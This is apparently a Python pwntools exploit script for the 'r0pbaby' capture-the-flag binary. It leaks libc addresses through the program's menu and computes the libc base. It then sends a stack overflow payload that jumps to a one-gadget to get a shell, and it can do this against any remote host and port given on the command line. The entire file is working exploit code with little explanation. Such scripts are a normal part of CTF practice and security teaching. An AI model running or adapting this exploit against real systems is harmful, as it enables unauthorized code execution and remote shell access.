#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

def exploit(r):

    r.sendlineafter(": ","1")
    r.recvuntil(": ")
    leak = r.recvn(18)
    libc_leak = (eval(leak))
    log.info("libc leak: %s"% hex(libc_leak))
    r.recvuntil(": ")
    r.sendline("2")
    r.sendlineafter("symbol: ","system")
    r.recvuntil("system: ")
    system_leak = eval(r.recvn(18))
    log.info("system: %s",hex(system_leak))
    binsh_offset = 0x18cd57
    system_offset = 0x45390
    libc_base = system_leak - system_offset
    log.info("base: %s",hex(libc_base))
    r.sendlineafter(": ","3")
    r.sendlineafter("): ","50")
    payload = ""
    payload += "a"*cyclic_find("baaaaaaa",n=8)
    payload += p64(libc_base+0xf1147) #one gadget
    #payload += p64(system_leak)
    #payload += p64(0)
    #payload += p64(libc_base+binsh_offset)
    payload += "B"*(50-len(payload))
    r.sendline(payload)


    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./r0pbaby"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [

            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

